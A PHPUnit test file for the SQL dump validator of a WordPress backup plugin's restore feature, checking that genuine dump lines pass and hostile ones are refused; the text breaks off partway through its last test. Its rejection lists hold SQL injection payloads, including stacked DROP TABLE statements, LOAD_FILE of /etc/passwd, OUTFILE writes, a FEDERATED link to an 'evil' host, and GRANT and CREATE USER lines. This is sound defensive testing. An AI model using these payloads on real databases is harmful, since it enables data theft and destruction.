<?php
namespace OpenVault\Backup\Tests\Unit;

use OpenVault\Backup\Engine\Dump\SqlValueFormatter;
use OpenVault\Backup\Restore\DumpRejectedException;
use OpenVault\Backup\Restore\DumpValidator;
use PHPUnit\Framework\TestCase;

/**
 * The statement whitelist of the database restore. The dump is untrusted input, so this is the most important test file of the
 * restore: every hostile line must be refused, every line that the dump writer produces must pass.
 *
 * @covers \OpenVault\Backup\Restore\DumpValidator
 * @covers \OpenVault\Backup\Restore\DumpRejectedException
 */
class DumpValidatorTest extends TestCase {

	/**
	 * @var DumpValidator
	 */
	private $v;

	protected function setUp(): void {
		parent::setUp();
		$this->v = new DumpValidator( 'wp_' );
	}

	/**
	 * @param string $line Line.
	 * @return array<string,mixed>
	 */
	private function ok( $line ) {
		return $this->v->check( $line );
	}

	private function bad( $line, $label = '' ) {
		try {
			$this->v->check( $line );
		} catch ( DumpRejectedException $e ) {
			// The message is fixed text: it never contains the line.
			$this->assertNotSame( '', $e->getMessage() );
			$sample = substr( (string) $line, 0, 40 );
			if ( strlen( $sample ) > 12 ) {
				$this->assertStringNotContainsString( $sample, $e->getMessage(), $label );
			}
			return;
		}
		$this->fail( 'Line was accepted but must be refused: ' . $label . ' ' . substr( addcslashes( (string) $line, "\0..\37" ), 0, 120 ) );
	}

	private static function create_sql( $table = 'wp_posts' ) {
		return 'CREATE TABLE `' . $table . '` ( `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `post_title` text COLLATE utf8mb4_unicode_ci NOT NULL, `note` varchar(20) DEFAULT \'a;b -- c\' COMMENT \'it\'\'s; fine /* x */\', `ts` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`ID`), KEY `title` (`post_title`(191)) ) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;';
	}

	public function test_constructor_refuses_an_unusable_prefix() {
		foreach ( array( '', 'wp-', 'wp ', "wp'", str_repeat( 'a', 41 ), 'wp_;' ) as $prefix ) {
			try {
				new DumpValidator( $prefix );
				$this->fail( 'accepted ' . $prefix );
			} catch ( \InvalidArgumentException $e ) {
				$this->assertSame( 'Invalid table prefix.', $e->getMessage() );
			}
		}
		$this->assertInstanceOf( DumpValidator::class, new DumpValidator( 'wp_9$_' ) );
	}

	public function test_blank_comment_header_and_end_lines() {
		$this->assertSame( DumpValidator::KIND_BLANK, $this->ok( '' )['kind'] );
		$this->assertSame( DumpValidator::KIND_COMMENT, $this->ok( '--' )['kind'] );
		$this->assertSame( DumpValidator::KIND_COMMENT, $this->ok( '-- just a note; DROP TABLE wp_users; --' )['kind'] );
		$this->assertSame( DumpValidator::KIND_COMMENT, $this->ok( "-- it's `quoted` \\' /*!50000 DROP TABLE x */" )['kind'] );
		$this->assertSame( DumpValidator::KIND_COMMENT, $this->ok( '-- ovb-dump-end ' )['kind'], 'the marker must match exactly' );
		$this->assertSame( DumpValidator::KIND_END, $this->ok( '-- ovb-dump-end' )['kind'] );

		$header = $this->ok( '-- table-prefix: wp_' );
		$this->assertSame( DumpValidator::KIND_HEADER, $header['kind'] );
		$this->assertSame( 'table-prefix', $header['key'] );
		$this->assertSame( 'wp_', $header['value'] );
		$this->assertSame( 'ovb-dump', $this->ok( '-- ovb-dump: 1' )['key'] );
		$this->assertSame( 'created-at', $this->ok( '-- created-at: 2026-01-01T00:00:00Z' )['key'] );
		$this->assertSame( DumpValidator::KIND_COMMENT, $this->ok( '-- Not A Header: x' )['kind'] );
	}

	public function test_comment_like_lines_that_are_not_comments_are_refused() {
		foreach ( array( '-', '-x', '--x', '-- ', '---', '- - x', '-1;', '--;', "-\t- x" ) as $line ) {
			if ( '-- ' === $line ) {
				$this->assertSame( DumpValidator::KIND_COMMENT, $this->ok( $line )['kind'] );
				continue;
			}
			$this->bad( $line, 'comment-like ' . $line );
		}
		foreach ( array( '#', '# DROP TABLE x', '/* x */', '/*!50000 DROP TABLE wp_users */;', ' -- x', "\t-- x", ' ' ) as $line ) {
			$this->bad( $line, 'other comment style' );
		}
	}

	public function test_set_statements_of_the_dump_writer_pass() {
		foreach ( array(
			'SET NAMES utf8mb4;',
			'SET NAMES utf8;',
			'SET NAMES utf8mb3;',
			'SET NAMES latin1;',
			'SET FOREIGN_KEY_CHECKS=0;',
			'SET FOREIGN_KEY_CHECKS=1;',
			'SET UNIQUE_CHECKS=0;',
			'SET UNIQUE_CHECKS=1;',
			"SET sql_mode='NO_AUTO_VALUE_ON_ZERO';",
			"SET sql_mode='';",
			"SET sql_mode='NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE';",
			"SET time_zone='+00:00';",
		) as $line ) {
			$this->assertSame( DumpValidator::KIND_SET, $this->ok( $line )['kind'], $line );
		}
	}

	public function test_dangerous_set_statements_are_refused() {
		foreach ( array(
			'SET GLOBAL max_connections=1;',
			'SET @@global.sql_mode=\'\';',
			'SET @@GLOBAL.read_only=1;',
			'SET SESSION sql_mode=\'\';',
			'SET PASSWORD FOR root=\'x\';',
			'SET PASSWORD=PASSWORD(\'x\');',
			'SET @a=1;',
			'SET @a=(SELECT 1);',
			'SET NAMES utf8mb4 COLLATE utf8mb4_bin;',
			'SET NAMES evil;',
			'SET NAMES utf16;',
			"SET NAMES 'utf8mb4';",
			'SET CHARACTER SET utf8;',
			'SET FOREIGN_KEY_CHECKS=2;',
			'SET FOREIGN_KEY_CHECKS=0, UNIQUE_CHECKS=0;',
			'SET FOREIGN_KEY_CHECKS = 0;',
			"SET sql_mode='NO_BACKSLASH_ESCAPES';",
			"SET sql_mode='ANSI_QUOTES';",
			"SET sql_mode='ANSI';",
			"SET sql_mode='PIPES_AS_CONCAT';",
			"SET sql_mode='NO_AUTO_VALUE_ON_ZERO,NO_BACKSLASH_ESCAPES';",
			"SET sql_mode='NO_AUTO_VALUE_ON_ZERO' ;",
			"SET sql_mode=''; DROP TABLE wp_users;",
			"SET sql_mode='x'' OR 1=1';",
			"SET time_zone='+01:00';",
			"SET time_zone='SYSTEM';",
			'SET time_zone=@@global.time_zone;',
			'set names utf8mb4;',
			'SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;',
			'SET autocommit=0;',
			'SET',
			'SET ;',
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_drop_table_rules() {
		$drop = $this->ok( 'DROP TABLE IF EXISTS `wp_posts`;' );
		$this->assertSame( DumpValidator::KIND_DROP, $drop['kind'] );
		$this->assertSame( 'wp_posts', $drop['table'] );
		$this->assertSame( 'wp_9', $this->ok( 'DROP TABLE IF EXISTS `wp_9`;' )['table'] );
		$this->assertSame( 'wp_a$b', $this->ok( 'DROP TABLE IF EXISTS `wp_a$b`;' )['table'] );

		foreach ( array(
			'DROP TABLE IF EXISTS `wp_users`; DROP TABLE IF EXISTS `wp_posts`;',
			'DROP TABLE IF EXISTS `wp_posts`,`wp_users`;',
			'DROP TABLE IF EXISTS `wp_posts`; DROP DATABASE wp;',
			'DROP TABLE `wp_posts`;',
			'DROP TABLE IF EXISTS wp_posts;',
			'DROP TABLE IF EXISTS `wp_posts` CASCADE;',
			'DROP TABLE IF EXISTS `wp_ovb_backups`;',
			'DROP TABLE IF EXISTS `wp_OVB_logs`;',
			'DROP TABLE IF EXISTS `WP_ovb_restores`;',
			'DROP TABLE IF EXISTS `wp_ovb_`;',
			'DROP TABLE IF EXISTS `other_posts`;',
			'DROP TABLE IF EXISTS `mysql`.`user`;',
			'DROP TABLE IF EXISTS `wp_posts`.`x`;',
			'DROP TABLE IF EXISTS `wp_po``sts`;',
			'DROP TABLE IF EXISTS `wp_posts``;',
			'DROP TABLE IF EXISTS `wp_`;',
			'DROP TABLE IF EXISTS ``;',
			'DROP TABLE IF EXISTS `wp_ünïcode`;',
			'DROP TABLE IF EXISTS `wp_' . str_repeat( 'a', 62 ) . '`;',
			'DROP DATABASE `wp`;',
			'DROP DATABASE IF EXISTS wp;',
			'DROP USER x;',
			'DROP VIEW `wp_v`;',
			'DROP TRIGGER t;',
			'DROP PROCEDURE p;',
			'DROP FUNCTION f;',
			'DROP EVENT e;',
			'DROP TABLE IF EXISTS `wp_posts`',
			' DROP TABLE IF EXISTS `wp_posts`;',
			'drop table if exists `wp_posts`;',
			'DROP  TABLE IF EXISTS `wp_posts`;',
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_a_table_name_of_exactly_64_characters_passes_and_65_does_not() {
		$name = 'wp_' . str_repeat( 'a', 61 );
		$this->assertSame( 64, strlen( $name ) );
		$this->assertSame( $name, $this->ok( 'DROP TABLE IF EXISTS `' . $name . '`;' )['table'] );
		$this->bad( 'DROP TABLE IF EXISTS `' . $name . 'a`;' );
	}

	public function test_is_allowed_table() {
		$this->assertTrue( $this->v->is_allowed_table( 'wp_posts' ) );
		$this->assertTrue( $this->v->is_allowed_table( 'wp_actionscheduler_actions' ) );
		$this->assertFalse( $this->v->is_allowed_table( 'wp_ovb_logs' ) );
		$this->assertFalse( $this->v->is_allowed_table( 'wp_OVB_logs' ) );
		$this->assertFalse( $this->v->is_allowed_table( 'wp_' ) );
		$this->assertFalse( $this->v->is_allowed_table( 'wp' ) );
		$this->assertFalse( $this->v->is_allowed_table( 'xx_posts' ) );
		$this->assertFalse( $this->v->is_allowed_table( 'WP_posts' ) );
		$this->assertFalse( $this->v->is_allowed_table( 'wp_po sts' ) );
		$this->assertFalse( $this->v->is_allowed_table( "wp_x\n" ) );
		$this->assertFalse( $this->v->is_allowed_table( null ) );
		$this->assertFalse( $this->v->is_allowed_table( 'wp_' . str_repeat( 'a', 62 ) ) );
	}

	public function test_a_prefix_that_itself_starts_with_ovb_still_protects_the_plugin_tables() {
		$v = new DumpValidator( 'ovb_' );
		$this->assertSame( 'ovb_posts', $v->check( 'DROP TABLE IF EXISTS `ovb_posts`;' )['table'] );
		$this->expectException( DumpRejectedException::class );
		$v->check( 'DROP TABLE IF EXISTS `ovb_ovb_logs`;' );
	}

	public function test_create_table_of_the_dump_writer_passes() {
		$result = $this->ok( self::create_sql() );
		$this->assertSame( DumpValidator::KIND_CREATE, $result['kind'] );
		$this->assertSame( 'wp_posts', $result['table'] );
	}

	public function test_create_table_with_the_mysql8_encryption_comment_passes_but_no_other_comment() {
		$line = rtrim( self::create_sql(), ';' ) . " /*!80016 DEFAULT ENCRYPTION='N' */;";
		$this->assertSame( DumpValidator::KIND_CREATE, $this->ok( $line )['kind'] );
		$this->bad( rtrim( self::create_sql(), ';' ) . " /*!80016 DEFAULT ENCRYPTION='Y' */;" );
		$this->bad( rtrim( self::create_sql(), ';' ) . ' /*!50100 PARTITION BY HASH (ID) */;' );
		$this->bad( rtrim( self::create_sql(), ';' ) . " /*!80016 DEFAULT ENCRYPTION='N' */ /* x */;" );
	}

	public function test_a_string_literal_cannot_hide_a_comment_or_a_second_statement_in_create_table() {
		// The text inside a string is data, whatever it looks like.
		$line = 'CREATE TABLE `wp_t` ( `a` varchar(9) DEFAULT \'x\\\'; DROP TABLE wp_users; --\' ) ENGINE=InnoDB;';
		$this->assertSame( DumpValidator::KIND_CREATE, $this->ok( $line )['kind'] );
		$line = 'CREATE TABLE `wp_t` ( `a` varchar(9) COMMENT "a;b/*c*/d" ) ENGINE=InnoDB;';
		$this->assertSame( DumpValidator::KIND_CREATE, $this->ok( $line )['kind'] );
		// The same text with the string closed early is a second statement.
		$this->bad( 'CREATE TABLE `wp_t` ( `a` varchar(9) DEFAULT \'x\'; DROP TABLE wp_users; --\' ) ENGINE=InnoDB;' );
		$this->bad( 'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB; DROP TABLE `wp_users`;' );
	}

	public function test_hostile_create_table_statements_are_refused() {
		$base = 'CREATE TABLE `wp_t` ( `a` int ) ';
		foreach ( array(
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB DATA DIRECTORY=\'/tmp\';',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB INDEX DIRECTORY=\'/tmp\';',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=FEDERATED CONNECTION=\'mysql://u:p@evil/db/t\';',
			$base . 'ENGINE=MEMORY;',
			$base . 'ENGINE=MERGE UNION=(`wp_users`);',
			$base . 'ENGINE=CSV;',
			$base . 'ENGINE = FEDERATED;',
			$base . 'ENGINE=;',
			$base . 'engine=federated;',
			$base . 'ENGINE=InnoDB CONNECTION=\'x\';',
			$base . 'ENGINE=InnoDB PASSWORD=\'x\';',
			$base . 'ENGINE=InnoDB TABLESPACE ts;',
			$base . 'ENGINE=InnoDB; SELECT 1 INTO OUTFILE \'/tmp/x\';',
			$base . 'ENGINE=InnoDB SELECT * FROM `wp_users`;',
			'CREATE TABLE `wp_t` ( `a` int DEFAULT LOAD_FILE(\'/etc/passwd\') ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int DEFAULT (SLEEP(10)) ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int DEFAULT (BENCHMARK(1000000,MD5(1))) ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB /*!50000 DATA DIRECTORY=\'/tmp\' */;',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB /*!80016 DEFAULT ENCRYPTION=\'N\' */ /*! x */;',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB /* x */;',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB # x',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB -- x',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB --x;',
			'CREATE TABLE `wp_t` ( `a` int ) \\ ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int, FOREIGN KEY (`a`) REFERENCES `wp_ovb_backups` (`id`) ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int, FOREIGN KEY (`a`) REFERENCES `WP_OVB_backups` (`id`) ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int, FOREIGN KEY (`a`) REFERENCES `mysql`.`user` (`id`) ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int, FOREIGN KEY (`a`) REFERENCES `wp_users`.`id` ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int, FOREIGN KEY (`a`) REFERENCES db.`x` (`id`) ) ENGINE=InnoDB;',
			'CREATE TABLE `wp_t` ( `a` int, FOREIGN KEY (`a`) REFERENCES `wp_t`.`id` ) ENGINE=InnoDB;',
			'CREATE TEMPORARY TABLE `wp_t` ( `a` int );',
			'CREATE TABLE IF NOT EXISTS `wp_t` ( `a` int );',
			'CREATE TABLE `wp_t` LIKE `wp_users`;',
			'CREATE TABLE `wp_t` AS SELECT * FROM `wp_users`;',
			'CREATE TABLE `wp_t`(`a` int);',
			'CREATE TABLE `wp_ovb_t` ( `a` int );',
			'CREATE TABLE `other_t` ( `a` int );',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB',
			'CREATE TABLE `wp_t` ( `a` int',
			'CREATE TRIGGER t BEFORE INSERT ON `wp_posts` FOR EACH ROW SET NEW.a=1;',
			'CREATE PROCEDURE p() SELECT 1;',
			'CREATE FUNCTION f() RETURNS int RETURN 1;',
			'CREATE EVENT e ON SCHEDULE EVERY 1 SECOND DO DROP TABLE wp_users;',
			'CREATE VIEW `wp_v` AS SELECT * FROM `wp_users`;',
			'CREATE USER \'x\'@\'%\' IDENTIFIED BY \'y\';',
			'CREATE DATABASE evil;',
			'CREATE INDEX i ON `wp_posts` (`a`);',
			'create table `wp_t` ( `a` int );',
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_a_plugin_table_name_inside_a_string_or_a_comment_of_a_column_is_only_data() {
		$line = 'CREATE TABLE `wp_t` ( `a` varchar(9) COMMENT \'wp_ovb_backups\' ) ENGINE=InnoDB;';
		$this->assertSame( DumpValidator::KIND_CREATE, $this->ok( $line )['kind'] );
	}

	public function test_insert_statements_of_the_dump_writer_pass() {
		$row    = SqlValueFormatter::format_row(
			array( 1, "it's \"quoted\"; DROP TABLE wp_users; -- x\\", "line\nbreak\r\n\0nul\x1a", null, "\xF0\x9F\x94\x92 \xE2\x80\x99 emoji", 'a:1:{s:1:"k";s:3:"v\'x";}', "\xFF\xFE" ),
			array(
				array(
					'type'   => 'bigint(20)',
					'binary' => false,
				),
				array(
					'type'   => 'text',
					'binary' => false,
				),
				array(
					'type'   => 'text',
					'binary' => false,
				),
				array(
					'type'   => 'text',
					'binary' => false,
				),
				array(
					'type'   => 'text',
					'binary' => false,
				),
				array(
					'type'   => 'longtext',
					'binary' => false,
				),
				array(
					'type'   => 'text',
					'binary' => false,
				),
			)
		);
		$line   = 'INSERT INTO `wp_posts` VALUES ' . $row . ',' . $row . ';';
		$result = $this->ok( $line );
		$this->assertSame( DumpValidator::KIND_INSERT, $result['kind'] );
		$this->assertSame( 'wp_posts', $result['table'] );
		$this->assertSame( 2, $result['rows'] );
	}

	public function test_insert_value_forms() {
		foreach ( array(
			'INSERT INTO `wp_t` VALUES (1);',
			'INSERT INTO `wp_t` VALUES (-1);',
			'INSERT INTO `wp_t` VALUES (0);',
			'INSERT INTO `wp_t` VALUES (007);',
			'INSERT INTO `wp_t` VALUES (1.5);',
			'INSERT INTO `wp_t` VALUES (-0.25);',
			'INSERT INTO `wp_t` VALUES (1.0e+25);',
			'INSERT INTO `wp_t` VALUES (1e-7);',
			'INSERT INTO `wp_t` VALUES (123456789012345678901234567890);',
			'INSERT INTO `wp_t` VALUES (NULL);',
			'INSERT INTO `wp_t` VALUES (\'\');',
			'INSERT INTO `wp_t` VALUES (0x00);',
			'INSERT INTO `wp_t` VALUES (0xDEADbeef);',
			'INSERT INTO `wp_t` VALUES (0x1);',
			'INSERT INTO `wp_t` VALUES (NULL,1,\'a\',0xFF,-2.5);',
			'INSERT INTO `wp_t` VALUES (1),(2),(3);',
			'INSERT INTO `wp_t` (`a`,`b`) VALUES (1,2),(3,4);',
			'INSERT INTO `wp_t` (`a`) VALUES (1);',
			'INSERT INTO `wp_t` (`ünï`) VALUES (1);',
			'INSERT INTO `wp_t` VALUES (\'\\\'\');',
			'INSERT INTO `wp_t` VALUES (\'\\\\\');',
			'INSERT INTO `wp_t` VALUES (\'\\\\\\\'\');',
			'INSERT INTO `wp_t` VALUES (\'it\'\'s\');',
			'INSERT INTO `wp_t` VALUES (\'\'\'\');',
			'INSERT INTO `wp_t` VALUES (\'; DROP TABLE wp_users;\');',
			'INSERT INTO `wp_t` VALUES (\'a\'\'); DROP TABLE wp_users; --\');',
			'INSERT INTO `wp_t` VALUES (\'a\\\'); DROP TABLE wp_users; --\');',
			'INSERT INTO `wp_t` VALUES (\'-- x\',\'/* y */\',\'#z\',\'`w`\',\'"v"\');',
			'INSERT INTO `wp_t` VALUES (\'*/ /*!50000 DROP TABLE wp_users */\');',
			'INSERT INTO `wp_t` VALUES (\'a\\nb\\rc\\0d\\Ze\\%f\\_g\');',
			"INSERT INTO `wp_t` VALUES ('tab\there');",
			"INSERT INTO `wp_t` VALUES ('\xE2\x80\x99 \xE2\x80\x98 \xE2\x80\x9C unicode quotes \xE2\x80\x9D');",
			"INSERT INTO `wp_t` VALUES ('\xF0\x9F\x94\x92');",
		) as $line ) {
			$result = $this->ok( $line );
			$this->assertSame( DumpValidator::KIND_INSERT, $result['kind'], $line );
			$this->assertSame( 'wp_t', $result['table'] );
		}
		$this->assertSame( 3, $this->ok( 'INSERT INTO `wp_t` VALUES (1),(2),(3);' )['rows'] );
	}

	public function test_stacked_and_malformed_insert_statements_are_refused() {
		foreach ( array(
			'INSERT INTO `wp_t` VALUES (1); DROP TABLE `wp_users`;',
			'INSERT INTO `wp_t` VALUES (1);DROP TABLE wp_users;',
			'INSERT INTO `wp_t` VALUES (1);;',
			'INSERT INTO `wp_t` VALUES (1),;',
			'INSERT INTO `wp_t` VALUES ();',
			'INSERT INTO `wp_t` VALUES (,);',
			'INSERT INTO `wp_t` VALUES (1,);',
			'INSERT INTO `wp_t` VALUES (1 );',
			'INSERT INTO `wp_t` VALUES ( 1);',
			'INSERT INTO `wp_t` VALUES (1) ;',
			'INSERT INTO `wp_t` VALUES (1), (2);',
			'INSERT INTO `wp_t` VALUES (1)(2);',
			'INSERT INTO `wp_t` VALUES (1',
			'INSERT INTO `wp_t` VALUES 1;',
			'INSERT INTO `wp_t` VALUES;',
			'INSERT INTO `wp_t`;',
			'INSERT INTO `wp_t` VALUES (1) ON DUPLICATE KEY UPDATE a=1;',
			'INSERT INTO `wp_t` VALUES (1) -- x',
			'INSERT INTO `wp_t` VALUES (1) # x',
			'INSERT INTO `wp_t` VALUES (1) /* x */;',
			'INSERT INTO `wp_t` VALUES (1/* x */);',
			'INSERT INTO `wp_t` VALUES (1-- x',
			'INSERT INTO `wp_t` VALUES (\'a\');-- x',
			'INSERT INTO `wp_t` VALUES (\'a\'); -- x',
			'INSERT INTO `wp_t` VALUES (\'a\' -- x',
			'INSERT INTO `wp_t` VALUES (\'a\'/*!50000 ,1 */);',
			'INSERT INTO `wp_t` VALUES (\'unterminated);',
			'INSERT INTO `wp_t` VALUES (\'a\\\');',
			'INSERT INTO `wp_t` VALUES (\'a\'\');',
			'INSERT INTO `wp_t` VALUES (\'a\'b\');',
			'INSERT INTO `wp_t` VALUES (\'a\' \'b\');',
			'INSERT INTO `wp_t` VALUES (\'\\\');',
			'INSERT INTO `wp_t` VALUES ("a");',
			'INSERT INTO `wp_t` VALUES (`a`);',
			'INSERT INTO `wp_t` VALUES (a);',
			'INSERT INTO `wp_t` VALUES (null);',
			'INSERT INTO `wp_t` VALUES (NULLx);',
			'INSERT INTO `wp_t` VALUES (NUL);',
			'INSERT INTO `wp_t` VALUES (TRUE);',
			'INSERT INTO `wp_t` VALUES (DEFAULT);',
			'INSERT INTO `wp_t` VALUES (1+1);',
			'INSERT INTO `wp_t` VALUES (1-1);',
			'INSERT INTO `wp_t` VALUES (--1);',
			'INSERT INTO `wp_t` VALUES (+1);',
			'INSERT INTO `wp_t` VALUES (.5);',
			'INSERT INTO `wp_t` VALUES (1.);',
			'INSERT INTO `wp_t` VALUES (1e);',
			'INSERT INTO `wp_t` VALUES (0x);',
			'INSERT INTO `wp_t` VALUES (0xZZ);',
			'INSERT INTO `wp_t` VALUES (0x12G);',
			'INSERT INTO `wp_t` VALUES (X\'AB\');',
			'INSERT INTO `wp_t` VALUES (x\'AB\');',
			'INSERT INTO `wp_t` VALUES (b\'01\');',
			'INSERT INTO `wp_t` VALUES (0b01);',
			'INSERT INTO `wp_t` VALUES (_utf8\'a\');',
			'INSERT INTO `wp_t` VALUES (N\'a\');',
			'INSERT INTO `wp_t` VALUES (@a);',
			'INSERT INTO `wp_t` VALUES (@@global.x);',
			'INSERT INTO `wp_t` VALUES ((SELECT 1));',
			'INSERT INTO `wp_t` VALUES (LOAD_FILE(\'/etc/passwd\'));',
			'INSERT INTO `wp_t` VALUES (CONCAT(\'a\',\'b\'));',
			'INSERT INTO `wp_t` VALUES (SLEEP(5));',
			'INSERT INTO `wp_t` VALUES (NOW());',
			'INSERT INTO `wp_t` VALUES (1) INTO OUTFILE \'/tmp/x\';',
			'INSERT INTO `wp_t` SELECT * FROM `wp_users`;',
			'INSERT INTO `wp_t` SET a=1;',
			'INSERT INTO `wp_t` (`a`) SELECT 1;',
			'INSERT INTO `wp_t` (`a`) VALUES (1) ',
			'INSERT INTO `wp_t` (`a`,) VALUES (1);',
			'INSERT INTO `wp_t` (`a`b`) VALUES (1);',
			'INSERT INTO `wp_t` (a) VALUES (1);',
			'INSERT INTO `wp_t` () VALUES (1);',
			'INSERT INTO `wp_t` (`a`); DROP TABLE wp_users; (`b`) VALUES (1);',
			'INSERT INTO `wp_t` (`a`) (`b`) VALUES (1);',
			'INSERT INTO `wp_t` (`a`)VALUES (1);',
			'INSERT INTO `wp_t`  VALUES (1);',
			'INSERT INTO `wp_t` VALUES  (1);',
			'INSERT IGNORE INTO `wp_t` VALUES (1);',
			'INSERT INTO `wp_t` VALUES (1);' . "\x00",
			'INSERT INTO wp_t VALUES (1);',
			'insert into `wp_t` values (1);',
			'REPLACE INTO `wp_t` VALUES (1);',
			'INSERT INTO `mysql`.`user` VALUES (1);',
			'INSERT INTO `wp_t`.`x` VALUES (1);',
			'INSERT INTO `wp_ovb_backups` VALUES (1);',
			'INSERT INTO `wp_Ovb_logs` VALUES (1);',
			'INSERT INTO `other_t` VALUES (1);',
			'INSERT INTO `wp_ünï` VALUES (1);',
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_other_statements_are_refused() {
		foreach ( array(
			'USE mysql;',
			'USE `wp`;',
			'SELECT 1;',
			'SELECT * FROM `wp_users` INTO OUTFILE \'/tmp/x\';',
			'SELECT LOAD_FILE(\'/etc/passwd\');',
			'UPDATE `wp_users` SET `user_pass`=\'x\';',
			'DELETE FROM `wp_users`;',
			'TRUNCATE TABLE `wp_users`;',
			'TRUNCATE `wp_users`;',
			'RENAME TABLE `wp_users` TO `wp_x`;',
			'ALTER TABLE `wp_users` ADD COLUMN x int;',
			'ALTER USER root IDENTIFIED BY \'x\';',
			'GRANT ALL ON *.* TO \'x\'@\'%\';',
			'REVOKE ALL ON *.* FROM x;',
			'FLUSH PRIVILEGES;',
			'LOAD DATA INFILE \'/etc/passwd\' INTO TABLE `wp_t`;',
			'LOAD DATA LOCAL INFILE \'x\' INTO TABLE `wp_t`;',
			'HANDLER `wp_users` OPEN;',
			'CALL p();',
			'DO SLEEP(10);',
			'DO 1;',
			'EXECUTE s;',
			'PREPARE s FROM \'DROP TABLE wp_users\';',
			'KILL 1;',
			'SHUTDOWN;',
			'INSTALL PLUGIN x SONAME \'x.so\';',
			'BEGIN;',
			'COMMIT;',
			'START TRANSACTION;',
			'LOCK TABLES `wp_users` WRITE;',
			'UNLOCK TABLES;',
			'SHOW TABLES;',
			'EXPLAIN SELECT 1;',
			'CHECK TABLE `wp_users`;',
			'OPTIMIZE TABLE `wp_users`;',
			';',
			';;',
			'x;',
			'DELIMITER ;;',
			'\\! ls',
			'\\G',
			'source /etc/passwd',
			'SELECT 1',
			'DROP TABLE IF EXISTS `wp_posts`; SELECT 1;',
			'/*!50000 DROP TABLE wp_users */;',
			'/*!40101 SET NAMES utf8 */;',
			'/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;',
			'/*M!999999\\- enable the sandbox mode */',
			'UNLOCK TABLES;',
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_control_characters_and_bad_encoding_are_refused_everywhere() {
		foreach ( array(
			"INSERT INTO `wp_t` VALUES ('a\0b');",
			"INSERT INTO `wp_t` VALUES ('a\rb');",
			"INSERT INTO `wp_t` VALUES ('a\nb');",
			"-- comment with a NUL \0",
			"-- comment with a CR \r",
			"SET NAMES utf8mb4;\r",
			"DROP TABLE IF EXISTS `wp_t`;\n",
			"\0",
			"\r",
			"\n",
			"INSERT INTO `wp_t` VALUES ('\xFF');",
			"INSERT INTO `wp_t` VALUES ('\xC3\x28');",
			"INSERT INTO `wp_t` VALUES ('\xE2\x82');",
			"INSERT INTO `wp_t` VALUES ('\xF0\x28\x8C\xBC');",
			"-- comment with bad UTF-8 \xFF",
			"INSERT INTO `wp_t` VALUES ('\xED\xA0\x80');",
		) as $line ) {
			$this->bad( $line, addcslashes( $line, "\0..\37\177..\377" ) );
		}
	}

	public function test_unicode_look_alikes_are_not_sql_syntax() {
		// Outside a literal they are just not part of the grammar.
		foreach ( array(
			"INSERT INTO `wp_t` VALUES (\xE2\x80\x99a\xE2\x80\x99);",
			"INSERT INTO `wp_t` VALUES ('a'\xE2\x80\x99);",
			"INSERT INTO `wp_t` VALUES (1)\xE2\x80\x9B;",
			"INSERT INTO `wp_t` VALUES (\xEF\xBC\x91);",
			"INSERT INTO \xEF\xBD\x80wp_t\xEF\xBD\x80 VALUES (1);",
			"DROP TABLE IF EXISTS `wp_t`\xEF\xBC\x9B DROP TABLE x;",
			"DROP\xC2\xA0TABLE IF EXISTS `wp_t`;",
			"DROP TABLE IF EXISTS `wp_t`;\xC2\xA0",
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_backtick_tricks_in_table_and_column_names_are_refused() {
		foreach ( array(
			'INSERT INTO `wp_t``; DROP TABLE wp_users; --` VALUES (1);',
			'INSERT INTO `wp_t`` VALUES (1);',
			'INSERT INTO `wp_t` (`a`; DROP TABLE wp_users;--`) VALUES (1);',
			'INSERT INTO `wp_t` (`a`) VALUES (1) `;',
			'DROP TABLE IF EXISTS `wp_t` `x`;',
			'DROP TABLE IF EXISTS `wp_t`, `wp_users`;',
			'INSERT INTO `wp_t` (`` ) VALUES (1);',
			"INSERT INTO `wp_t` (`a\x01`) VALUES (1);",
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_comment_terminator_and_executable_comment_tricks_are_refused() {
		foreach ( array(
			'INSERT INTO `wp_t` VALUES (1) */;',
			'INSERT INTO `wp_t` VALUES (1,/*!50000 2) ,(3 */);',
			'INSERT INTO `wp_t` VALUES (/*!50000 1 */);',
			'INSERT INTO `wp_t` VALUES (1);/*!50000 DROP TABLE wp_users */',
			'DROP TABLE IF EXISTS `wp_t`/*!50000 ,`wp_users` */;',
			'DROP TABLE IF EXISTS `wp_t`; /*!50000 DROP TABLE wp_users */;',
			'SET NAMES utf8mb4/*!50000 ; DROP TABLE wp_users */;',
			"SET sql_mode=''/*!50000 ,NO_BACKSLASH_ESCAPES */;",
